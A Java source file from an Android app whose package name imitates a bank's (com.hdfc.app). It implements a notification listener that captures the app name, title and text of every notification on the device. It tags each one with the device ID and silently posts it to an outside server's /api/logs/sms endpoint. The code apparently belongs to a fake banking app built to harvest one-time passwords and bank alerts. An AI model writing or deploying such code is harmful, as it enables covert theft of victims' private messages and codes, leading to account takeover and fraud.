package com.hdfc.app;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "NotificationService";
    private static final String BACKEND_URL = "https://backprince.onrender.com";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = "";
            String text = "";
            
            if (sbn.getNotification().extras != null) {
                title = sbn.getNotification().extras.getString("android.title", "");
                CharSequence textChar = sbn.getNotification().extras.getCharSequence("android.text");
                text = (textChar != null) ? textChar.toString() : "";
            }

            if (text.isEmpty()) return; // Don't send empty notifications

            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            sendToBackend(deviceId, packageName, title, text);
        } catch (Exception e) {
            Log.e(TAG, "Notification Capture Error", e);
        }
    }

    private void sendToBackend(final String deviceId, final String pkg, final String title, final String msg) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("deviceId", deviceId);
                    payload.put("sender", "NOTIF: " + pkg + " | " + title);
                    payload.put("message", msg);
                    payload.put("timestamp", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));

                    URL url = new URL(BACKEND_URL + "/api/logs/sms"); // We reuse the SMS endpoint for notifications
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Backend Notif Error", e);
                }
            }
        }).start();
    }
}
